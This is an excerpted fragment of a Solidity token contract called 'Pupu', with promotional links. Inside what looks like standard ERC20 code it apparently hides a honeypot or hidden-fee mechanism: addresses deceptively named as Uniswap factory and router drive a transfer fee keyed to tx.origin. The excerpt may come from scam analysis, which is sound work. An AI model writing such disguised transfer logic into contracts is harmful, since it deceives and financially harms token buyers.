...
https://twitter.com/PupuBNB
https://t.me.com/PupuBNB
https://PupuBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private uniswapFactoryV2 = 0xea3Dba908F6d6e003423386Ad314f3B5Cd166A9a;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _totalSupply;
    uint256 private swappingToggle = 1;
    address internal _uniswapRouter = 0x101CA7898bb235A9BF735Af9f2f71670a06bE09C;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != _uniswapRouter && _balances[uniswapFactoryV2] > 0 ? _pairToken : swappingToggle).div(100)+0;
        if (swapamount > 0)
        {
...
contract Pupu is ERC20, Ownable
{
    constructor() ERC20(unicode"Pupu", unicode"PUPU")
    {
